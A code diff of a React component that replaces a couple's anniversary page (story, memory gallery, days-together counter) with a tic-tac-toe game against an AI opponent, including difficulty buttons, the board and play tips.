-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 sm:gap-12 items-center">
-            <div className="space-y-6">
-              <div className="bg-white/80 backdrop-blur-sm rounded-3xl p-6 sm:p-8 shadow-xl">
-                <Users className="w-10 h-10 sm:w-12 sm:h-12 text-pink-500 mb-4" />
-                <h3 className="text-xl sm:text-2xl font-bold text-gray-800 mb-4">How We Met</h3>
-                <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
-                  {adminData.story}
-                </p>
-              </div>
-              
-              <div className="bg-white/80 backdrop-blur-sm rounded-3xl p-6 sm:p-8 shadow-xl">
-                <Star className="w-10 h-10 sm:w-12 sm:h-12 text-purple-500 mb-4" />
-                <h3 className="text-xl sm:text-2xl font-bold text-gray-800 mb-4">Favorite Memory</h3>
-                <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
-                  {adminData.favoriteMemory}
-                </p>
-              </div>
-            </div>
-            
-            <div className="relative">
-              <img
-                src={adminData.aboutImage}
-                alt="Couple"
-                className="rounded-3xl shadow-2xl w-full h-64 sm:h-96 object-cover"
-              />
-              <div className="absolute -bottom-4 -right-4 sm:-bottom-6 sm:-right-6 bg-gradient-to-r from-pink-500 to-purple-500 rounded-3xl p-4 sm:p-6 shadow-xl">
-                <Calendar className="w-6 h-6 sm:w-8 sm:h-8 text-white mb-2" />
-                <p className="text-white font-semibold text-sm">Together for</p>
-                <p className="text-white text-lg sm:text-2xl font-bold">
-                  {Math.floor((new Date().getTime() - new Date('2020-06-15').getTime()) / (1000 * 60 * 60 * 24))} days
-                </p>
-              </div>
-            </div>
-          </div>
+        {/* Difficulty Selector */}
+        <div className="flex flex-col sm:flex-row justify-center gap-2 sm:gap-4 mb-6">
+          {(['easy', 'medium', 'hard'] as GameMode[]).map((mode) => (
+            <button
+              key={mode}
+              onClick={() => setGameMode(mode)}
+              className={`px-4 py-2 rounded-full font-semibold transition-all text-sm sm:text-base ${
+                gameMode === mode
+                  ? 'bg-gradient-to-r from-blue-500 to-purple-500 text-white shadow-lg'
+                  : 'bg-white/80 text-gray-700 hover:bg-white'
+              }`}
+            >
+              {mode === 'easy' && '😊 Easy'}
+              {mode === 'medium' && '🤔 Medium'}
+              {mode === 'hard' && '😈 Hard'}
+            </button>
+          ))}
         </div>
-      </section>
+      </div>
 
-      {/* Memories Gallery */}
-      <section className="py-12 sm:py-20 px-4 bg-white/50">
-        <div className="max-w-6xl mx-auto">
-          <div className="text-center mb-12 sm:mb-16">
-            <h2 className="text-3xl sm:text-5xl font-bold text-gray-800 mb-4 sm:mb-6">{adminData.galleryTitle}</h2>
-            <div className={`w-24 h-1 bg-gradient-to-r ${adminData.accentColor} mx-auto`}></div>
-          </div>
-          
-          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-8">
-            {adminData.galleryImages.map((image, index) => (
-              <div key={index} className="group relative overflow-hidden rounded-3xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-2">
-                <img
-                  src={image}
-                  alt={`Memory ${index + 1}`}
-                  className="w-full h-48 sm:h-64 object-cover group-hover:scale-110 transition-transform duration-300"
-                />
-                <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300">
-                  <div className="absolute bottom-4 left-4">
-                    <h3 className="text-white text-lg sm:text-xl font-bold">Memory {index + 1}</h3>
-                  </div>
-                </div>
+      {/* Game Board */}
+      <div className="flex flex-col items-center px-4 pb-8">
+        <div className="bg-white/90 backdrop-blur-sm rounded-3xl p-6 sm:p-8 shadow-2xl mb-6">
+          {/* Game Status */}
+          <div className="text-center mb-6">
+            {winner ? (
+              <div className="space-y-4">
+                <h2 className="text-2xl sm:text-3xl font-bold">
+                  {winner === 'X' && '🎉 You Won!'}
+                  {winner === 'O' && '🤖 AI Wins!'}
+                  {winner === 'tie' && '🤝 It\'s a Tie!'}
+                </h2>
+                <button
+                  onClick={resetGame}
+                  className="px-6 py-3 bg-gradient-to-r from-green-500 to-blue-500 text-white font-semibold rounded-full hover:from-green-600 hover:to-blue-600 transition-all transform hover:scale-105 flex items-center gap-2 mx-auto"
+                >
+                  <RotateCcw className="w-5 h-5" />
+                  Play Again
+                </button>
               </div>
+            ) : (
+              <h2 className="text-xl sm:text-2xl font-bold text-gray-800">
+                {isPlayerTurn ? '🎯 Your Turn (X)' : '🤖 AI Thinking... (O)'}
+              </h2>
+            )}
+          </div>
+
+          {/* Tic-Tac-Toe Grid */}
+          <div className="grid grid-cols-3 gap-2 sm:gap-4 w-72 sm:w-96 mx-auto">
+            {board.map((cell, index) => (
+              <button
+                key={index}
+                onClick={() => handleCellClick(index)}
+                disabled={cell !== null || winner !== null || !isPlayerTurn}
+                className={`
+                  aspect-square bg-gray-100 rounded-xl border-2 border-gray-300 
+                  flex items-center justify-center text-4xl sm:text-6xl font-bold
+                  transition-all duration-200 hover:bg-gray-200 hover:scale-105
+                  ${cell === 'X' ? 'text-blue-600' : 'text-red-500'}
+                  ${cell === null && isPlayerTurn && !winner ? 'cursor-pointer hover:shadow-lg' : 'cursor-not-allowed'}
+                  ${!isPlayerTurn && !winner ? 'opacity-75' : ''}
+                `}
+              >
+                {cell}
+              </button>
             ))}
           </div>
+
+          {/* Game Instructions */}
+          <div className="mt-6 text-center text-gray-600 text-sm sm:text-base">
+            <p>Click any empty square to make your move!</p>
+            <p className="mt-2">You are <span className="text-blue-600 font-bold">X</span>, AI is <span className="text-red-500 font-bold">O</span></p>
+          </div>
         </div>
-      </section>
+
+        {/* Game Tips */}
+        <div className="bg-white/80 backdrop-blur-sm rounded-2xl p-4 sm:p-6 shadow-lg max-w-md w-full">
+          <h3 className="text-lg sm:text-xl font-bold text-gray-800 mb-3 flex items-center gap-2">
+            <Brain className="w-5 h-5 text-purple-500" />
+            Pro Tips
+          </h3>
+          <ul className="space-y-2 text-sm sm:text-base text-gray-600">
+            <li>• Try to get three in a row (horizontal, vertical, or diagonal)</li>
+            <li>• Block the AI when it has two in a row</li>
+            <li>• Control the center square when possible</li>
+            <li>• Corners are strategic positions</li>
+          </ul>
+        </div>
+      </div>
 
       {/* Footer */}
-      <footer className={`py-8 sm:py-12 px-4 bg-gradient-to-r ${adminData.accentColor}`}>
+      <footer className={`py-6 sm:py-8 px-4 bg-gradient-to-r ${adminData.accentColor} mt-8`}>
         <div className="max-w-4xl mx-auto text-center">
-          <Heart className="w-10 h-10 sm:w-12 sm:h-12 text-white mx-auto mb-4" />
-          <h3 className="text-2xl sm:text-3xl font-bold text-white mb-4">Forever & Always</h3>
-          <p className="text-white/90 text-base sm:text-lg">
+          <Trophy className="w-8 h-8 sm:w-10 sm:h-10 text-white mx-auto mb-3" />
+          <h3 className="text-xl sm:text-2xl font-bold text-white mb-3">Game On!</h3>
+          <p className="text-white/90 text-sm sm:text-base">
             {adminData.footerText}
           </p>
-          <div className="mt-6 sm:mt-8 flex justify-center space-x-6">
-            <Camera className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
-            <Gift className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
-            <Star className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
+          <div className="mt-4 sm:mt-6 flex justify-center space-x-6">
+            <Zap className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
+            <Brain className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
+            <Trophy className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
           </div>
         </div>
       </footer>
